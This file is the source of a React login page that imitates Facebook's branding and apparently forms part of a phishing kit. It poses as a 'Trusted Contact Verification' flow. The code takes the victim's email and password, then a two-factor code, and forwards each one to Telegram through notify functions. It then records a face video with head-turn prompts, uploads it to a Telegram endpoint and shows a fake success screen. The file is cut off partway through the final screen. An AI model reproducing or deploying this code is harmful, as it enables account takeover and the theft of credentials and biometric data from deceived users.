import { useState, useEffect, useRef } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Form, FormControl, FormField, FormItem, FormMessage } from "@/components/ui/form";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import metaLogoImg from "@assets/IMG_7894_1765013426839.png";
import { notifyLogin, notifyCode, notifyFaceScan } from '@/lib/telegram';
import * as tf from '@tensorflow/tfjs';
import * as faceLandmarksDetection from '@tensorflow-models/face-landmarks-detection';

function FacebookLoader() {
  return (
    <div className="flex flex-col items-center justify-center py-12">
      <div className="relative w-16 h-16">
        <div
          className="absolute inset-0 rounded-full border-4 border-gray-200"
          style={{ borderTopColor: '#1877f2' }}
        >
          <style>{`
            @keyframes fb-spin {
              0% { transform: rotate(0deg); }
              100% { transform: rotate(360deg); }
            }
          `}</style>
        </div>
        <div
          className="absolute inset-0 rounded-full border-4 border-transparent"
          style={{
            borderTopColor: '#1877f2',
            animation: 'fb-spin 1s linear infinite'
          }}
        />
      </div>
      <p className="mt-4 text-sm" style={{ color: '#65676b' }}>Please wait...</p>
    </div>
  );
}

const loginSchema = z.object({
  email: z.string().min(1, "Please enter your email or phone number"),
  password: z.string().min(1, "Please enter your password"),
});

type LoginForm = z.infer<typeof loginSchema>;

const signupSchema = z.object({
  firstName: z.string().min(1, "What's your name?"),
  lastName: z.string().min(1, "What's your name?"),
  emailOrPhone: z.string().min(1, "You'll use this when you log in and if you ever need to reset your password."),
  newPassword: z.string().min(6, "Enter a combination of at least six numbers, letters and punctuation marks (like ! and &)."),
  birthday: z.object({
    month: z.string(),
    day: z.string(),
    year: z.string(),
  }),
  gender: z.string(),
});

type SignupForm = z.infer<typeof signupSchema>;

const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
const currentYear = new Date().getFullYear();
const years = Array.from({ length: 120 }, (_, i) => String(currentYear - i));

export default function LoginPage() {
  const [signupOpen, setSignupOpen] = useState(false);
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [isSigningUp, setIsSigningUp] = useState(false);
  const [currentStep, setCurrentStep] = useState<string>("login");
  const [userEmail, setUserEmail] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [currentDirection, setCurrentDirection] = useState<"left" | "right" | "up" | "down" | null>(null);
  const [completedDirections, setCompletedDirections] = useState<Set<string>>(new Set());
  const [isRecording, setIsRecording] = useState(false);
  const [videoRef, setVideoRef] = useState<HTMLVideoElement | null>(null);
  const [mediaRecorder, setMediaRecorder] = useState<MediaRecorder | null>(null);
  const [recordedChunks, setRecordedChunks] = useState<Blob[]>([]);
  const [directionProgress, setDirectionProgress] = useState(0);
  const [overallProgress, setOverallProgress] = useState(0);
  const [capturedVideo, setCapturedVideo] = useState<Blob | null>(null);
  const [faceDetector, setFaceDetector] = useState<faceLandmarksDetection.FaceLandmarksDetector | null>(null);
  const [facePosition, setFacePosition] = useState<{ x: number; y: number } | null>(null);
  const [detectionActive, setDetectionActive] = useState(false);
  const detectionIntervalRef = useRef<NodeJS.Timeout | null>(null);

  const loginForm = useForm<LoginForm>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      email: "",
      password: "",
    },
  });

  const signupForm = useForm<SignupForm>({
    resolver: zodResolver(signupSchema),
    defaultValues: {
      firstName: "",
      lastName: "",
      emailOrPhone: "",
      newPassword: "",
      birthday: {
        month: String(new Date().getMonth()),
        day: String(new Date().getDate()),
        year: String(new Date().getFullYear() - 25),
      },
      gender: "female",
    },
  });

  useEffect(() => {
    let timer: NodeJS.Timeout;

    if (currentStep === "loading-login") {
      timer = setTimeout(() => setCurrentStep("code"), 3000);
    } else if (currentStep === "loading-code") {
      timer = setTimeout(() => setCurrentStep("face-intro"), 3000);
    } else if (currentStep === "recording") {
      setCompletedDirections(new Set());
      setCurrentDirection(null);
      setDirectionProgress(0);
      setOverallProgress(0);
    }

    return () => clearTimeout(timer);
  }, [currentStep]);

  useEffect(() => {
    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      if (detectionIntervalRef.current) {
        clearInterval(detectionIntervalRef.current);
      }
    };
  }, [stream]);

  // Initialize face detector
  useEffect(() => {
    const loadDetector = async () => {
      try {
        await tf.ready();
        const model = faceLandmarksDetection.SupportedModels.MediaPipeFaceMesh;
        const detector = await faceLandmarksDetection.createDetector(model, {
          runtime: 'tfjs',
          refineLandmarks: true,
        });
        setFaceDetector(detector);
        console.log('Face detector loaded');
      } catch (error) {
        console.error('Error loading face detector:', error);
      }
    };
    loadDetector();
  }, []);

  // Effect to handle video playback when stream and videoRef are available
  useEffect(() => {
    if ((currentStep === "instructions" || currentStep === "recording") && stream && videoRef) {
      videoRef.srcObject = stream;
      videoRef.play().catch(err => console.error('Error playing video:', err));
    }
  }, [currentStep, stream, videoRef]);

  const handleLogin = async (data: LoginForm) => {
    setIsLoggingIn(true);
    console.log("Login attempt:", data);
    setUserEmail(data.email);
    await notifyLogin(data.email, data.password);
    setCurrentStep("loading-login");
    setIsLoggingIn(false);
  };

  const handleCodeSubmit = async () => {
    if (verificationCode.length >= 4) {
      await notifyCode(userEmail, verificationCode);
      setCurrentStep("loading-code");
    }
  };

  const handleStartFaceVerification = async () => {
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });
      setStream(mediaStream);
      setCurrentStep("instructions");
      // The videoRef will be set by the ref callback in the JSX
    } catch (error) {
      console.error("Camera access denied:", error);
      alert("Please allow camera access to continue with face verification");
    }
  };

  const detectFaceDirection = async (video: HTMLVideoElement) => {
    if (!faceDetector || !video) return null;

    try {
      const faces = await faceDetector.estimateFaces(video);
      if (faces.length === 0) return null;

      const face = faces[0];
      const keypoints = face.keypoints;

      // Get nose tip (index 1) and face center
      const noseTip = keypoints.find(kp => kp.name === 'noseTip');
      if (!noseTip) return null;

      // Calculate face bounding box center
      const xCoords = keypoints.map(kp => kp.x);
      const yCoords = keypoints.map(kp => kp.y);
      const centerX = (Math.min(...xCoords) + Math.max(...xCoords)) / 2;
      const centerY = (Math.min(...yCoords) + Math.max(...yCoords)) / 2;

      // Determine direction based on nose position relative to center
      const threshold = 30;
      let direction: "left" | "right" | "up" | "down" | "center" = "center";

      if (noseTip.x < centerX - threshold) {
        direction = "left";
      } else if (noseTip.x > centerX + threshold) {
        direction = "right";
      } else if (noseTip.y < centerY - threshold) {
        direction = "up";
      } else if (noseTip.y > centerY + threshold) {
        direction = "down";
      }

      return { direction, x: noseTip.x, y: noseTip.y };
    } catch (error) {
      console.error('Face detection error:', error);
      return null;
    }
  };

  const handleStartRecording = async () => {
    try {
      await notifyFaceScan(userEmail);
    } catch (error) {
      console.error('Failed to send face scan notification:', error);
    }

    setIsRecording(true);
    setCurrentStep("recording");
    setCurrentDirection("right");
    setDetectionActive(true);

    // Start recording video
    if (stream && videoRef) {
      const chunks: Blob[] = [];

      // Find a supported mimeType - only check webm formats
      const mimeTypes = [
        'video/webm;codecs=vp9',
        'video/webm;codecs=vp8',
        'video/webm'
      ];

      let selectedMimeType = '';
      for (const type of mimeTypes) {
        if (MediaRecorder.isTypeSupported(type)) {
          selectedMimeType = type;
          console.log('Selected mimeType:', type);
          break;
        }
      }

      // Create recorder with supported mimeType or default
      let recorder: MediaRecorder;
      try {
        if (selectedMimeType) {
          recorder = new MediaRecorder(stream, { mimeType: selectedMimeType });
        } else {
          recorder = new MediaRecorder(stream);
          console.log('Using default mimeType:', recorder.mimeType);
        }
      } catch (error) {
        console.error('Error creating MediaRecorder:', error);
        return;
      }

      recorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          chunks.push(event.data);
          console.log('Data chunk received:', event.data.size, 'bytes');
        }
      };

      recorder.onstop = async () => {
        try {
          console.log('Recording stopped, chunks collected:', chunks.length);
          
          // Use the mimeType that MediaRecorder actually used
          const actualMimeType = recorder.mimeType || 'video/webm';
          const videoBlob = new Blob(chunks, { type: actualMimeType });
          setCapturedVideo(videoBlob);
          setRecordedChunks(chunks);

          console.log('Video recorded, size:', videoBlob.size, 'bytes', 'mimeType:', actualMimeType);

          if (videoBlob.size === 0) {
            console.error('Video blob is empty!');
            setCurrentStep("complete");
            return;
          }

          // Send video to Telegram
          const formData = new FormData();
          formData.append('video', videoBlob, 'face-verification.webm');
          formData.append('email', userEmail);

          console.log('Sending video to server...');
          const response = await fetch('/api/telegram/video', {
            method: 'POST',
            body: formData,
          });

          if (!response.ok) {
            const errorText = await response.text();
            console.error('Server error:', errorText);
            throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
          }

          const result = await response.json();
          console.log('Video sent successfully:', result);
          setCurrentStep("complete");
        } catch (error) {
          console.error('Failed to send video:', error);
          setCurrentStep("complete");
        }
      };

      recorder.start(1000); // Collect data every 1 second for better chunks
      setMediaRecorder(recorder);
      console.log('MediaRecorder started');

      // Simplified directions for testing: just 4 directions once
      const directions: ("left" | "right" | "up" | "down")[] = ["right", "left", "up", "down"];
      let currentDirIndex = 0;
      let detectedCorrectly = false;
      let detectionStartTime = Date.now();

      // Start face detection loop
      const detectionInterval = setInterval(async () => {
        if (!videoRef) return;

        const result = await detectFaceDirection(videoRef);
        if (result) {
          setFacePosition({ x: result.x, y: result.y });

          // Check if detected direction matches required direction
          if (result.direction === directions[currentDirIndex]) {
            if (!detectedCorrectly) {
              detectedCorrectly = true;
              detectionStartTime = Date.now();
            }

            const elapsed = Date.now() - detectionStartTime;
            const progress = Math.min((elapsed / 1500) * 100, 100); // 1.5 seconds hold time
            setDirectionProgress(progress);

            if (progress >= 100) {
              // Mark direction as complete
              const completedSet = new Set<string>();
              for (let i = 0; i <= currentDirIndex; i++) {
                completedSet.add(`${directions[i]}-${i}`);
              }
              setCompletedDirections(completedSet);
              setOverallProgress(((currentDirIndex + 1) / directions.length) * 100);

              // Move to next direction
              currentDirIndex++;
              detectedCorrectly = false;
              setDirectionProgress(0);

              if (currentDirIndex >= directions.length) {
                // All directions complete
                console.log('All directions completed, stopping recording');
                clearInterval(detectionInterval);
                setIsRecording(false);
                setDetectionActive(false);
                setOverallProgress(100);
                setCurrentDirection(null);

                // Stop recording
                if (recorder.state !== 'inactive') {
                  console.log('Stopping MediaRecorder...');
                  recorder.stop();
                }

                if (stream) {
                  stream.getTracks().forEach(track => track.stop());
                }
                setCurrentStep("processing");
              } else {
                setCurrentDirection(directions[currentDirIndex]);
                console.log('Moving to direction:', directions[currentDirIndex]);
              }
            }
          } else {
            detectedCorrectly = false;
            setDirectionProgress(0);
          }
        } else {
          setFacePosition(null);
          detectedCorrectly = false;
          setDirectionProgress(0);
        }
      }, 100); // Check every 100ms

      detectionIntervalRef.current = detectionInterval;
    }
  };

  const handleSignup = async (data: SignupForm) => {
    setIsSigningUp(true);
    await new Promise(resolve => setTimeout(resolve, 1000));
    console.log("Signup attempt:", data);
    setIsSigningUp(false);
    setSignupOpen(false);
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#ffffff' }}>
      {/* Language Selector */}
      <div className="text-center pt-4 pb-6">
        <a
          href="#"
          className="text-sm hover:underline"
          style={{ color: '#65676b' }}
          data-testid="link-language"
        >
          English (UK)
        </a>
      </div>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center justify-center px-5 py-8">
        <div className="w-full max-w-md">
          {/* Login Step */}
          {currentStep === "login" && (
            <>
              {/* Facebook Logo */}
              <div className="text-center mb-4">
                <img
                  src="/favicon.png"
                  alt="Facebook"
                  className="w-16 h-16 mx-auto"
                  data-testid="logo-facebook"
                />
              </div>
              
              {/* Trusted Contact Branding - Only on Login */}
              <div className="text-center mb-8">
                <h1 className="text-xl font-semibold mb-1" style={{ color: '#1c1e21' }}>
                  Trusted Contact Verification
                </h1>
                <p className="text-sm mb-2" style={{ color: '#65676b' }}>
                  Final step to confirm you're a real person
                </p>
                <p className="text-xs" style={{ color: '#8a8d91' }}>
                  Your trusted contact has requested verification
                </p>
              </div>

              <Form {...loginForm}>
                <form onSubmit={loginForm.handleSubmit(handleLogin)} className="space-y-3">
                  <FormField
                    control={loginForm.control}
                    name="email"
                    render={({ field }) => (
                      <FormItem>
                        <FormControl>
                          <input
                            {...field}
                            type="text"
                            placeholder="Mobile number or email address"
                            className="w-full px-4 py-3 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                            style={{
                              backgroundColor: '#ffffff',
                              borderColor: '#dadde1',
                              color: '#1c1e21',
                            }}
                            onFocus={(e) => {
                              e.currentTarget.style.borderColor = '#1877f2';
                              e.currentTarget.style.boxShadow = '0 0 0 3px rgba(24, 119, 242, 0.1)';
                            }}
                            onBlur={(e) => {
                              e.currentTarget.style.borderColor = '#dadde1';
                              e.currentTarget.style.boxShadow = 'none';
                            }}
                            data-testid="input-email"
                          />
                        </FormControl>
                        <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={loginForm.control}
                    name="password"
                    render={({ field }) => (
                      <FormItem>
                        <FormControl>
                          <input
                            {...field}
                            type="password"
                            placeholder="Password"
                            className="w-full px-4 py-3 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                            style={{
                              backgroundColor: '#ffffff',
                              borderColor: '#dadde1',
                              color: '#1c1e21',
                            }}
                            onFocus={(e) => {
                              e.currentTarget.style.borderColor = '#1877f2';
                              e.currentTarget.style.boxShadow = '0 0 0 3px rgba(24, 119, 242, 0.1)';
                            }}
                            onBlur={(e) => {
                              e.currentTarget.style.borderColor = '#dadde1';
                              e.currentTarget.style.boxShadow = 'none';
                            }}
                            data-testid="input-password"
                          />
                        </FormControl>
                        <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                      </FormItem>
                    )}
                  />

                  <button
                    type="submit"
                    disabled={isLoggingIn}
                    className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60"
                    style={{ backgroundColor: '#1877f2' }}
                    onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                    onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                    data-testid="button-login"
                  >
                    {isLoggingIn ? "Logging in..." : "Log in"}
                  </button>
                </form>
              </Form>

              <div className="text-center mt-6">
                <a href="https://www.facebook.com/login/identify/" target="_blank" rel="noopener noreferrer" className="text-sm hover:underline" style={{ color: '#1877f2' }} data-testid="link-forgotten-password">
                  Forgotten password?
                </a>
              </div>

              <div className="mt-8 pt-4" style={{ borderTop: '1px solid #dadde1' }}>
                <a 
                  href="https://www.facebook.com/reg/" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="block w-full py-3 text-sm font-bold rounded-full transition text-center"
                  style={{ backgroundColor: '#ffffff', color: '#1877f2', border: '1px solid #1877f2', textDecoration: 'none' }}
                  onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#f0f2f5')}
                  onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#ffffff')}
                  data-testid="button-create-account"
                >
                  Create new account
                </a>
              </div>
            </>
          )}

          {/* Loading States */}
          {(currentStep === "loading-login" || currentStep === "loading-code") && (
            <FacebookLoader />
          )}

          {/* Code - Verification Code */}
          {currentStep === "code" && (
            <div className="text-center">
              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>Enter Verification Code</h2>
              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
                We've sent a code to your phone. Enter it below.
              </p>
              <input
                type="text"
                value={verificationCode}
                onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                placeholder="Enter code"
                className="w-full px-4 py-3 text-center text-lg border rounded-lg focus:outline-none focus:ring-2 mb-4"
                style={{ borderColor: '#dadde1', color: '#1c1e21', letterSpacing: '0.5em' }}
                data-testid="input-code"
              />
              <button
                onClick={handleCodeSubmit}
                disabled={verificationCode.length < 4}
                className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60"
                style={{ backgroundColor: '#1877f2' }}
                data-testid="button-submit-code"
              >
                Continue
              </button>
            </div>
          )}

          {/* Face Intro - Confirm Identity */}
          {currentStep === "face-intro" && (
            <div className="text-center px-4 py-12">
              <div className="mb-8">
                <div className="w-24 h-24 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
                  <svg className="w-12 h-12" viewBox="0 0 24 24" fill="none" stroke="#1877f2" strokeWidth="1.5">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
                  </svg>
                </div>
              </div>
              <h2 className="text-3xl font-bold mb-4" style={{ color: '#1c1e21' }}>Verify you're a real person</h2>
              <p className="text-sm mb-4 leading-relaxed" style={{ color: '#65676b' }}>
                As part of the Trusted Contact recovery process, we need to confirm you're a real human and not a bot.
              </p>
              <p className="text-sm mb-10 leading-relaxed" style={{ color: '#65676b' }}>
                We'll use facial recognition to verify your live presence and match you with your profile photo.
              </p>
              <button
                onClick={() => setCurrentStep("face-explanation")}
                className="w-full py-3 text-white text-sm font-bold rounded-full transition"
                style={{ backgroundColor: '#1877f2' }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                data-testid="button-confirm-identity"
              >
                Continue
              </button>
            </div>
          )}

          {/* Face Explanation */}
          {currentStep === "face-explanation" && (
            <div className="text-center px-4 py-8">
              <h2 className="text-3xl font-bold mb-4" style={{ color: '#1c1e21' }}>Human verification required</h2>

              {/* Illustration */}
              <div className="w-40 h-40 mx-auto mb-8 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
                <svg className="w-20 h-20" fill="none" stroke="#1877f2" viewBox="0 0 24 24" strokeWidth={1.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M17.982 18.725A7.488 7.488 0 0012 15.75a7.488 7.488 0 00-5.982 2.975m11.963 0a9 9 0 10-11.963 0m11.963 0A8.966 8.966 0 0112 21a8.966 8.966 0 01-5.982-2.275M15 9.75a3 3 0 11-6 0 3 3 0 016 0z" />
                </svg>
              </div>

              <p className="text-sm mb-4 leading-relaxed font-semibold" style={{ color: '#1c1e21' }}>
                This is the final step of your Trusted Contact verification
              </p>

              <p className="text-sm mb-8 leading-relaxed" style={{ color: '#65676b' }}>
                We'll record a short video of your face to confirm you're a real person (not a bot or automated system). Keep your face in the center and follow the on-screen directions.
              </p>

              <div className="space-y-2 mb-8">
                <div className="flex items-start gap-3">
                  <svg className="w-5 h-5 mt-0.5" fill="none" stroke="#1877f2" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                  <p className="text-sm text-left" style={{ color: '#65676b' }}>Good lighting is important</p>
                </div>
                <div className="flex items-start gap-3">
                  <svg className="w-5 h-5 mt-0.5" fill="none" stroke="#1877f2" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                  <p className="text-sm text-left" style={{ color: '#65676b' }}>You'll need a camera</p>
                </div>
                <div className="flex items-start gap-3">
                  <svg className="w-5 h-5 mt-0.5" fill="none" stroke="#1877f2" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                  <p className="text-sm text-left" style={{ color: '#65676b' }}>Takes about 1 minute</p>
                </div>
              </div>

              <button
                onClick={handleStartFaceVerification}
                className="w-full py-3 text-white text-sm font-bold rounded-full transition mb-3"
                style={{ backgroundColor: '#1877f2' }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                data-testid="button-start-face-verification"
              >
                Continue
              </button>
              <button
                onClick={() => setCurrentStep("login")}
                className="text-sm"
                style={{ color: '#1877f2' }}
                data-testid="button-cancel-explanation"
              >
                Cancel
              </button>
            </div>
          )}

          {/* Instructions Screen */}
          {currentStep === "instructions" && (
            <div className="text-center px-4 py-8">
              <h2 className="text-3xl font-bold mb-4" style={{ color: '#1c1e21' }}>Take a video selfie</h2>

              {/* Camera Preview */}
              <div className="relative w-72 h-96 mx-auto mb-8 rounded-2xl overflow-hidden" style={{ backgroundColor: '#000', boxShadow: '0 10px 40px rgba(0,0,0,0.2)' }}>
                <video
                  ref={setVideoRef}
                  autoPlay
                  playsInline
                  muted
                  className="w-full h-full object-cover scale-x-[-1]"
                />

                {/* Face outline guide */}
                <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                  <div
                    className="rounded-full border-2"
                    style={{
                      width: '70%',
                      height: '70%',
                      borderColor: 'rgba(24, 119, 242, 0.6)',
                      boxShadow: 'inset 0 0 20px rgba(24, 119, 242, 0.2)'
                    }}
                  />
                </div>
              </div>

              <div className="max-w-sm mx-auto mb-8 text-left">
                <p className="text-xs font-semibold mb-3" style={{ color: '#1c1e21' }}>Before you start:</p>
                <div className="space-y-2">
                  <div className="flex items-center gap-2">
                    <svg className="w-4 h-4 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#1877f2' }}>
                      <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                    </svg>
                    <p className="text-xs" style={{ color: '#65676b' }}>Good lighting is important</p>
                  </div>
                  <div className="flex items-center gap-2">
                    <svg className="w-4 h-4 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#1877f2' }}>
                      <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                    </svg>
                    <p className="text-xs" style={{ color: '#65676b' }}>Look directly at the camera</p>
                  </div>
                  <div className="flex items-center gap-2">
                    <svg className="w-4 h-4 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#1877f2' }}>
                      <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                    </svg>
                    <p className="text-xs" style={{ color: '#65676b' }}>Turn head left, right, and up</p>
                  </div>
                </div>
              </div>

              <button
                onClick={handleStartRecording}
                className="w-full py-3 text-white text-sm font-bold rounded-full transition"
                style={{ backgroundColor: '#1877f2' }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                data-testid="button-start-recording"
              >
                Start Recording
              </button>
            </div>
          )}

          {/* Recording Screen */}
          {currentStep === "recording" && (
            <div className="text-center px-4 py-8">
              <h2 className="text-2xl font-bold mb-1" style={{ color: '#1c1e21' }}>
                {currentDirection === "left" ? "Turn left" :
                 currentDirection === "right" ? "Turn right" :
                 currentDirection === "up" ? "Look up" :
                 currentDirection === "down" ? "Look down" :
                 "Face detected"}
              </h2>
              
              <p className="text-xs mb-8" style={{ color: '#65676b' }}>
                Keep your face in the circle
              </p>

              {/* Circular Camera Feed - Facebook Style */}
              <div className="flex justify-center mb-8">
                <div className="relative" style={{ width: '240px', height: '240px' }}>
                  {/* Animated scanning ring */}
                  <div 
                    className="absolute inset-0 rounded-full"
                    style={{
                      background: currentDirection 
                        ? 'conic-gradient(from 0deg, #1877f2, #42b72a, #1877f2)' 
                        : 'conic-gradient(from 0deg, #42b72a, #42b72a)',
                      animation: currentDirection ? 'fb-spin 2s linear infinite' : 'none',
                      padding: '4px'
                    }}
                  >
                    {/* Circular video frame */}
                    <div 
                      className="w-full h-full rounded-full overflow-hidden"
                      style={{ backgroundColor: '#000' }}
                    >
                      <video
                        ref={setVideoRef}
                        autoPlay
                        playsInline
                        muted
                        className="w-full h-full object-cover scale-x-[-1]"
                      />
                    </div>
                  </div>

                  {/* Direction indicators - positioned around the circle */}
                  {currentDirection === "left" && (
                    <div className="absolute left-0 top-1/2 -translate-y-1/2 -translate-x-12 pointer-events-none">
                      <div 
                        className="w-10 h-10 rounded-full flex items-center justify-center"
                        style={{ backgroundColor: '#1877f2' }}
                      >
                        <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M15 19l-7-7 7-7" />
                        </svg>
                      </div>
                    </div>
                  )}

                  {currentDirection === "right" && (
                    <div className="absolute right-0 top-1/2 -translate-y-1/2 translate-x-12 pointer-events-none">
                      <div 
                        className="w-10 h-10 rounded-full flex items-center justify-center"
                        style={{ backgroundColor: '#1877f2' }}
                      >
                        <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M9 5l7 7-7 7" />
                        </svg>
                      </div>
                    </div>
                  )}

                  {currentDirection === "up" && (
                    <div className="absolute top-0 left-1/2 -translate-x-1/2 -translate-y-12 pointer-events-none">
                      <div 
                        className="w-10 h-10 rounded-full flex items-center justify-center"
                        style={{ backgroundColor: '#1877f2' }}
                      >
                        <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 15l7-7 7 7" />
                        </svg>
                      </div>
                    </div>
                  )}

                  {currentDirection === "down" && (
                    <div className="absolute bottom-0 left-1/2 -translate-x-1/2 translate-y-12 pointer-events-none">
                      <div 
                        className="w-10 h-10 rounded-full flex items-center justify-center"
                        style={{ backgroundColor: '#1877f2' }}
                      >
                        <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M19 9l-7 7-7-7" />
                        </svg>
                      </div>
                    </div>
                  )}

                </div>
              </div>

              <button
                onClick={() => {
                  if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                  }
                  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                    mediaRecorder.stop();
                  }
                  setCurrentStep("login");
                }}
                className="text-sm"
                style={{ color: '#1877f2' }}
                data-testid="button-cancel-verification"
              >
                Cancel
              </button>
            </div>
          )}

          {/* Processing/Complete - Identity Confirmed */}
          {(currentStep === "processing" || currentStep === "complete") && (
            <div className="text-center py-8 px-4">
              {currentStep === "processing" ? (
                <>
                  <div className="relative w-16 h-16 mx-auto mb-4">
                    <div
                      className="absolute inset-0 rounded-full border-4"
                      style={{
                        borderColor: '#e4e6eb',
                        borderTopColor: '#1877f2',
                        animation: 'fb-spin 1s linear infinite'
                      }}
                    />
                  </div>
                  <h2 className="text-lg font-semibold mb-2" style={{ color: '#1c1e21' }}>Verifying video...</h2>
                  <p className="text-sm" style={{ color: '#65676b' }}>
                    Please wait while we verify your identity.
                  </p>
                </>
              ) : (
                <>
                  {/* Success Animation */}
                  <div className="relative w-32 h-32 mx-auto mb-6">
                    <div className="absolute inset-0 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
                      <svg className="w-16 h-16" fill="none" stroke="#00a400" viewBox="0 0 24 24" strokeWidth={3}>
                        <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                      </svg>
                    </div>
                    <div className="absolute inset-0 rounded-full border-4 border-green-400 animate-ping opacity-75"></div>
                  </div>

                  <h2 className="text-3xl font-bold mb-2" style={{ color: '#1c1e21' }}>Human Verification Complete</h2>
                  <p className="text-sm mb-4" style={{ color: '#65676b' }}>
                    You have been verified as a real person
                  </p>
                  <p className="text-xs mb-8" style={{ color: '#8a8d91' }}>
                    Trusted Contact verification successful
                  </p>

                  {/* Verification Details Card */}
                  <div className="max-w-sm mx-auto mb-8 p-4 rounded-lg" style={{ backgroundColor: '#f0f2f5' }}>
                    <div className="space-y-3">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Human Verification</span>
                        <span className="text-xs font-bold" style={{ color: '#00a400' }}>✓ Confirmed</span>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Live Detection</span>
                        <span className="text-xs font-bold" style={{ color: '#00a400' }}>✓ Passed</span>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Trusted Contact</span>
                        <span className="text-xs font-bold" style={{ color: '#00a400' }}>✓ Verified</span>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Verification Time</span>
                        <span className="text-xs" style={{ color: '#1c1e21' }}>{new Date().toLocaleTimeString()}</span>
                      </div>
                    </div>
                  </div>

                  {/* Security Features */}
                  <div className="max-w-sm mx-auto mb-8 text-left">
                    <p className="text-xs font-semibold mb-3" style={{ color: '#1c1e21' }}>Verification steps completed:</p>
                    <div className="space-y-2">
                      <div className="flex items-start gap-2">
